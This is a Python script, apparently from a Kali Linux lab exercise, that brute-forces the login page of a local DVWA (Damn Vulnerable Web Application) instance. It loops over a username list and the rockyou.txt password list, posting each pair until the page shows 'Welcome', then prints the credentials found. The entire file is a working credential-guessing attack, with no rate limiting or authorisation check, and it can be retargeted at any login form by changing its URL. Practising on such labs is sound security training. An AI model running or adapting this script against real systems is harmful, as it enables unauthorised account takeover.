import requests
import time

# Configuration
url = "http://localhost/DVWA/login.php"
username_file = "/home/kali/Desktop/username.txt"
password_file = "/usr/share/wordlists/rockyou.txt"
success_condition = "Welcome"

# Load Wordlists with error handling for non-UTF-8 characters
with open(username_file, 'r', encoding='utf-8', errors='ignore') as file:
    usernames = file.read().splitlines()

with open(password_file, 'r', encoding='latin1') as file:
    passwords = file.read().splitlines()

# Initialize variables
attempts = 0
start_time = time.time()

# Brute-force logic
for username in usernames:
    for password in passwords:
        attempts += 1
        response = requests.post(url, data={"username": username, "password": password})
        
        if success_condition in response.text:
            print(f"Success! Username: {username}, Password: {password}")
            end_time = time.time()
            print(f"Total Attempts: {attempts}")
            print(f"Time Elapsed: {end_time - start_time:.2f} seconds")
            exit()

print("Brute-force attempt failed.")
